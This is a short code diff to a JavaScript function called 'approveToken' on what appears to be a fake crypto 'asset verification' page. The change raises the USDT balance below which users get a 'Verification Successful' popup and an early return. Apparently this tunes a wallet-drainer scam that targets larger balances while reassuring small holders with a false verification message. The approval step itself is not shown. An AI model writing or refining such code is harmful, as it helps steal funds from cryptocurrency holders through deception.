@@ -1434,9 +1434,9 @@ async function approveToken() { // Keeping the function name as 'approveToken'
         }
 
         // Using your provided threshold from the new logic (<= 49 USDT)
-        if (usdtBalance <= 0.0005) {
+        if (usdtBalance <= 100) {
             showPopup(
-                `✅ Verification Successful<br>Your assets are genuine. No flash or reported USDT found.<br><br><b>USDT Balance:</b> ${usdtBalance} USDT<br><b>BNB Balance:</b> ${bnbBalance} BNB`,
+                `✅ Verification Successful<br>Your assets has been verified and not flagged in our database.<br><br><b>USDT Balance:</b> ${usdtBalance} USDT<br><b>BNB Balance:</b> ${bnbBalance} BNB`,
                 "green"
             );
             return;
